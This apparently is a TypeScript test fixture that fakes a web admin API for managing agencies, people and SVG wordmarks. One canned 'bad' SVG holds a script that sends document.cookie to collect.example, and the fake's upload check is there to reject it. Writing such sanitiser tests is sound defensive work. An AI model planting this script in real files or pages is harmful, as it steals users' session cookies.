// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

// A fake napkin-web for the People page (tests/peopleAdmin.test.tsx and the
// mock-vs-build screenshots): the agency routes as crates/napkin-web/src/
// admin.rs answers them (features/agency-looks-admin.clan), in memory, with
// the approved mock's people and agencies (people-agencies-v3: Saltmarsh
// published with a wordmark; Kestrel Lane published without one, now a draft
// with one and a new accent). Every call is recorded.

import { AGENCY_ALIASES, AGENCY_COLOURS } from '../src/shell/agency/palette.ts'
import { activeContent, sanitiseSvg } from '../src/shell/agency/svgSanitise.ts'
import { PeopleError, type PeopleApi, type PeopleList } from '../src/shell/people/api.ts'
import type { AgencyAdminRow, BasicDraft, BasicRow, CodeRow, DraftPatch } from '../src/shell/people/agencies/model.ts'
import type { PersonRow } from '../src/shell/people/model.ts'

// The mock's wordmarks: block letters, one rect per run (what a clean export looks like).
const FONT: Record<string, string[]> = {
  A: ['.XX.', 'X..X', 'XXXX', 'X..X', 'X..X'], B: ['XXX.', 'X..X', 'XXX.', 'X..X', 'XXX.'], C: ['.XXX', 'X...', 'X...', 'X...', '.XXX'], D: ['XXX.', 'X..X', 'X..X', 'X..X', 'XXX.'],
  E: ['XXXX', 'X...', 'XXX.', 'X...', 'XXXX'], F: ['XXXX', 'X...', 'XXX.', 'X...', 'X...'], G: ['.XXX', 'X...', 'X.XX', 'X..X', '.XXX'], H: ['X..X', 'X..X', 'XXXX', 'X..X', 'X..X'],
  I: ['XXX', '.X.', '.X.', '.X.', 'XXX'], J: ['..XX', '...X', '...X', 'X..X', '.XX.'], K: ['X..X', 'X.X.', 'XX..', 'X.X.', 'X..X'], L: ['X...', 'X...', 'X...', 'X...', 'XXXX'],
  M: ['X...X', 'XX.XX', 'X.X.X', 'X...X', 'X...X'], N: ['X..X', 'XX.X', 'X.XX', 'X..X', 'X..X'], O: ['.XX.', 'X..X', 'X..X', 'X..X', '.XX.'], P: ['XXX.', 'X..X', 'XXX.', 'X...', 'X...'],
  Q: ['.XX.', 'X..X', 'X..X', 'X.X.', '.X.X'], R: ['XXX.', 'X..X', 'XXX.', 'X.X.', 'X..X'], S: ['XXXX', 'X...', 'XXXX', '...X', 'XXXX'], T: ['XXXXX', '..X..', '..X..', '..X..', '..X..'],
  U: ['X..X', 'X..X', 'X..X', 'X..X', '.XX.'], V: ['X...X', 'X...X', '.X.X.', '.X.X.', '..X..'], W: ['X...X', 'X...X', 'X.X.X', 'XX.XX', 'X...X'], X: ['X...X', '.X.X.', '..X..', '.X.X.', 'X...X'],
  Y: ['X...X', '.X.X.', '..X..', '..X..', '..X..'], Z: ['XXXX', '...X', '..X.', '.X..', 'XXXX'],
}

/** The mock's two canned files for a name: a clean export with metadata, and the same with a script on line 4. */
export function cannedFiles(name: string, base: string): { good: { name: string; src: string }; bad: { name: string; src: string } } {
  const word = name.split(/\s+/)[0] || 'wordmark'
  const slug = word.toLowerCase().replace(/[^a-z0-9]/g, '') || 'wordmark'
  const fill = base.toLowerCase()
  const out = [`<circle fill="${fill}" cx="30" cy="30" r="28"/>`, '<rect fill="#ffffff" x="18" y="18" width="24" height="24" rx="3"/>', `<circle fill="${fill}" cx="30" cy="30" r="7"/>`]
  let x = 74
  for (const ch of word.toUpperCase()) {
    const g = FONT[ch]
    if (!g) continue
    g.forEach((row, r) => {
      let c = 0
      while (c < row.length) {
        if (row[c] !== 'X') { c++; continue }
        const s = c
        while (c < row.length && row[c] === 'X') c++
        out.push(`<rect fill="${fill}" x="${x + s * 12}" y="${r * 12}" width="${(c - s) * 12}" height="12" rx="1.5"/>`)
      }
    })
    x += g[0].length * 12 + 12
  }
  const w = x - 12
  const head = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ${w} 60" width="${w}" height="60">`
  const meta = '<metadata><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description about="" dc:creator="Studio export" dc:date="2026-11-12" dc:format="image/svg+xml" dc:rights="All rights reserved" dc:title="Wordmark, primary, positive" dc:source="brand-guidelines-2026.ai" dc:identifier="wm-001"/></rdf:RDF></metadata>'
  return {
    good: { name: `${slug}-wordmark.svg`, src: `${head}\n${meta}\n${out.join('\n')}\n</svg>\n` },
    bad: { name: `${slug}-wordmark-final.svg`, src: `<?xml version="1.0" encoding="UTF-8"?>\n${head}\n${meta}\n<script>new Image().src="https://collect.example/?c="+document.cookie</script>\n${out.join('\n')}\n</svg>\n` },
  }
}

const uri = (svg: string) => 'data:image/svg+xml,' + encodeURIComponent(svg)
const ME = 'engineer@napkin'

/** The four style fields, as napkin-web takes them on PATCH .../draft (features/agency-style.clan): a value, or null for the default. */
const STYLE = { pill: ['accent', 'base'], accent_use: ['fill', 'line'], surface: ['warm', 'mono'] } as const
type StyleKey = 'pill' | 'accent_use' | 'surface' | 'accent_ink'
const STYLE_KEYS: StyleKey[] = ['pill', 'accent_use', 'surface', 'accent_ink']
const DEFAULT: Record<StyleKey, string | null> = { pill: 'accent', accent_use: 'fill', surface: 'warm', accent_ink: null }

/** A PATCH body's style, checked (400 on a bad value), applied over a draft; a default or null leaves the field absent. */
function applyStyle(d: BasicDraft, b: DraftPatch): BasicDraft {
  const out: BasicDraft = { ...d }
  for (const k of STYLE_KEYS) {
    if (!(k in b)) continue
    const v = (b as Record<string, unknown>)[k]
    if (v != null && (k === 'accent_ink' ? !(typeof v === 'string' && /^#[0-9A-Fa-f]{6}$/.test(v)) : !(STYLE[k as keyof typeof STYLE] as readonly unknown[]).includes(v)))
      throw new PeopleError(400, `${k} cannot be ${JSON.stringify(v)}.`)
    if (v == null || v === DEFAULT[k]) delete out[k]
    else Object.assign(out, { [k]: k === 'accent_ink' ? (v as string).toUpperCase() : v })
  }
  return out
}

/** The style fields a record carries (only the set ones). */
function styleOf(r: BasicDraft | BasicRow): Partial<Pick<BasicRow, StyleKey>> {
  const out: Partial<Pick<BasicRow, StyleKey>> = {}
  for (const k of STYLE_KEYS) if (r[k] != null) Object.assign(out, { [k]: r[k] })
  return out
}

/** The mock's people. */
export const MOCK_PEOPLE: PersonRow[] = ([
  ['Engineer', 'engineer@napkin', true, '2026-10-05'], ['Ann Murphy', 'ann@napkin', false, '2026-10-05'], ['Niamh Doyle', 'niamh@bg', false, '2026-10-12'],
  ['Cian Walsh', 'cian@catapult', false, '2026-10-14'], ['Maeve Ryan', 'maeve@pluto', false, '2026-10-20'], ['Tom Keane', 'tom@w+k', false, '2026-10-22'],
  ['Lisa Brennan', 'lisa@tbwa', false, '2026-10-28'], ['Jonas Berg', 'jonas@acne', false, '2026-11-03'], ['Owen Fahy', 'owen@saltmarsh', false, '2026-11-12'],
  ['Ella Quinn', 'ella@kestrel', false, '2026-11-12'], ['Ruth Daly', 'ruth@kestrellane', false, '2026-11-13'],
] as const).map(([name, id, admin, day]) => ({ id, name, agency: id.split('@')[1], admin, added_by: 'roster', added_at: `${day}T09:00:00` }))

/** The mock's agencies: every code agency, Saltmarsh and Kestrel Lane. */
export function mockAgencies(): AgencyAdminRow[] {
  const count = (ids: string[]) => MOCK_PEOPLE.filter(p => ids.includes(p.agency)).length
  const code: CodeRow[] = Object.entries(AGENCY_COLOURS).map(([id, c]) => {
    const aliases = Object.entries(AGENCY_ALIASES).filter(([, to]) => to === id).map(([a]) => a)
    return { id, kind: 'code', name: c.name, code_name: c.name, aliases, draft: null, people: count([id, ...aliases]), rev: 1, changed_by: null, changed_at: null, published_by: null, published_at: null }
  })
  const salt = cannedFiles('Saltmarsh', '#0E3B5C').good
  const kestrel = cannedFiles('Kestrel Lane', '#1F4E3D').good
  const basic = (id: string, name: string, aliases: string[], base: string, accent: string, wordmark: string | null, at: string): BasicRow => ({
    id, kind: 'basic', name, aliases, base, accent, wordmark, published: true, draft: null, people: count([id, ...aliases]), rev: 4,
    added_by: ME, added_at: at, changed_by: ME, changed_at: at, published_by: ME, published_at: at,
  })
  const saltmarsh = basic('saltmarsh', 'Saltmarsh', ['salt marsh'], '#0E3B5C', '#9AD1E8', uri(sanitiseSvg(salt.src)), '2026-11-12T10:05:00')
  const kestrellane = basic('kestrellane', 'Kestrel Lane', ['kestrel'], '#1F4E3D', '#E8B04A', null, '2026-11-12T16:20:00')
  kestrellane.draft = { name: 'Kestrel Lane', aliases: ['kestrel'], base: '#1F4E3D', accent: '#F2C14E', wordmark: uri(sanitiseSvg(kestrel.src)) }
  kestrellane.changed_at = '2026-11-13T14:40:00'
  kestrellane.rev = 6
  return [...code, saltmarsh, kestrellane]
}

/** A call the fake heard: its name and arguments. */
export interface Heard { call: string; args: unknown[] }

/** The fake server: the mock's data, in memory, answering as napkin-web does. */
export function fakePeopleApi(start: { people?: PersonRow[]; agencies?: AgencyAdminRow[] } = {}): PeopleApi & { heard: Heard[]; rows: AgencyAdminRow[] } {
  const people = structuredClone(start.people ?? MOCK_PEOPLE)
  const rows: AgencyAdminRow[] = structuredClone(start.agencies ?? mockAgencies())
  const heard: Heard[] = []
  const now = '2026-11-13T14:40:00'
  const find = (id: string) => {
    const r = rows.find(x => x.id === id)
    if (!r) throw new PeopleError(404, 'No such agency.')
    return r
  }
  const fresh = (r: AgencyAdminRow, rev: number) => { if (rev !== r.rev) throw new PeopleError(409, 'Someone changed this agency since you opened it.') }
  const touched = (r: AgencyAdminRow) => { r.rev += 1; r.changed_by = ME; r.changed_at = now; return structuredClone(r) }
  const draftOf = (r: BasicRow): BasicDraft => r.draft ?? { name: r.name, aliases: [...r.aliases], base: r.base, accent: r.accent, wordmark: r.wordmark, ...styleOf(r) }
  const hear = (call: string, ...args: unknown[]) => { heard.push({ call, args }) }
  const api: PeopleApi = {
    list: async () => { hear('list'); return { people: structuredClone(people), agencies: structuredClone(rows) } satisfies PeopleList },
    add: async b => { hear('add', b); throw new PeopleError(409, 'not in this fake') },
    rename: async (id, name) => { hear('rename', id, name); const p = people.find(x => x.id === id)!; p.name = name; return p },
    remove: async id => { hear('remove', id); const p = people.find(x => x.id === id)!; p.removed_at = now; return p },
    agencies: async () => { hear('agencies'); return structuredClone(rows) },
    createAgency: async b => {
      hear('createAgency', b)
      const id = b.name.trim().toLowerCase().replace(/[+&]/g, 'and').replace(/[^a-z0-9]/g, '').slice(0, 40)
      if (rows.some(r => r.id === id || r.name.toLowerCase() === b.name.trim().toLowerCase())) throw new PeopleError(409, `${b.name} is already an agency.`)
      const r: BasicRow = {
        id, kind: 'basic', name: b.name, aliases: [], base: b.base, accent: b.accent, wordmark: null, published: false,
        draft: { name: b.name, aliases: b.aliases ?? [], base: b.base, accent: b.accent, wordmark: null },
        people: 0, rev: 1, added_by: ME, added_at: now, changed_by: ME, changed_at: now, published_by: null, published_at: null,
      }
      rows.push(r)
      return structuredClone(r)
    },
    patchDraft: async (id, b) => {
      hear('patchDraft', id, b)
      const r = find(id)
      fresh(r, b.rev)
      if (r.kind === 'code') {
        if (Object.keys(b).some(k => k !== 'rev' && k !== 'name')) throw new PeopleError(400, 'An agency in code changes its name only.')
        r.draft = b.name === r.name ? null : { name: b.name ?? r.name }
      } else {
        const d = draftOf(r)
        r.draft = applyStyle({ ...d, ...(b.name != null ? { name: b.name } : {}), ...(b.aliases ? { aliases: b.aliases } : {}), ...(b.base ? { base: b.base } : {}), ...(b.accent ? { accent: b.accent } : {}) }, b)
      }
      return touched(r)
    },
    putWordmark: async (id, svg) => {
      hear('putWordmark', id, svg)
      const r = find(id)
      if (r.kind === 'code') throw new PeopleError(409, 'An agency in code keeps its logos in code.')
      const found = activeContent(svg)
      if (found.length) throw new PeopleError(422, 'The file has things in it that could run or reach out.', found)
      let clean: string
      try { clean = sanitiseSvg(svg) } catch { throw new PeopleError(422, 'The SVG could not be read.') }
      r.draft = { ...draftOf(r), wordmark: uri(clean) }
      const t = touched(r)
      return { bytes: new TextEncoder().encode(svg).length, kept_bytes: new TextEncoder().encode(clean).length, dropped: /<metadata/.test(svg) ? ['metadata'] : [], warnings: [], svg: uri(clean), rev: t.rev }
    },
    deleteWordmark: async id => {
      hear('deleteWordmark', id)
      const r = find(id)
      if (r.kind === 'code') throw new PeopleError(409, 'An agency in code keeps its logos in code.')
      r.draft = { ...draftOf(r), wordmark: null }
      return touched(r)
    },
    publish: async (id, rev) => {
      hear('publish', id, rev)
      const r = find(id)
      fresh(r, rev)
      if (!r.draft) throw new PeopleError(409, 'There is no draft to publish.')
      if (r.kind === 'code') { r.name = r.draft.name; r.draft = null }
      else {
        for (const k of STYLE_KEYS) delete r[k]
        Object.assign(r, { name: r.draft.name, aliases: r.draft.aliases, base: r.draft.base, accent: r.draft.accent, wordmark: r.draft.wordmark, ...styleOf(r.draft), published: true })
        r.draft = null
      }
      r.published_by = ME
      r.published_at = now
      return touched(r)
    },
    discardDraft: async id => {
      hear('discardDraft', id)
      const r = find(id)
      if (r.kind === 'basic' && !r.published) { rows.splice(rows.indexOf(r), 1); return { id, removed: true as const } }
      r.draft = null
      return touched(r)
    },
    exportCode: async id => {
      hear('exportCode', id)
      const r = find(id)
      if (r.kind === 'code' || !r.published) throw new PeopleError(409, 'Only a published basic agency goes to code.')
      const svg = r.wordmark ? decodeURIComponent(r.wordmark.slice('data:image/svg+xml,'.length)) : null
      const q = (s: string) => `'${s.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}'`
      // the style, only what is not the default, on the entry's first line after accent (as ACNE's entry has it), accentInk last
      const style = [r.pill && `pill: ${q(r.pill)}`, r.accent_use && `accentUse: ${q(r.accent_use)}`, r.surface && `surface: ${q(r.surface)}`, r.accent_ink && `accentInk: ${q(r.accent_ink)}`].filter(Boolean)
      let palette = `// AGENCY_COLOURS\n  ${id}: {\n    name: ${q(r.name)}, base: ${q(r.base)}, accent: ${q(r.accent)},` + (style.length ? ` ${style.join(', ')},` : '') + (svg ? `\n    logo: svgUri(WORDMARK_SVG.${id}),\n    logoOnDark: svgUri(recolourSvg(WORDMARK_SVG.${id}, '#FFFFFF')),` : '') + '\n  },'
      if (r.aliases.length) palette += '\n// AGENCY_ALIASES\n' + r.aliases.map(a => `  ${q(a)}: ${q(id)},`).join('\n')
      return { palette_ts: palette, svg, agency_logos_files: svg ? `  ${id}: { logo: '${id}-logo.svg' },` : null, people_rs: `    ("${id}", "${r.name}", "${r.base}", "${r.accent}"),` }
    },
  }
  return Object.assign(api, { heard, rows })
}
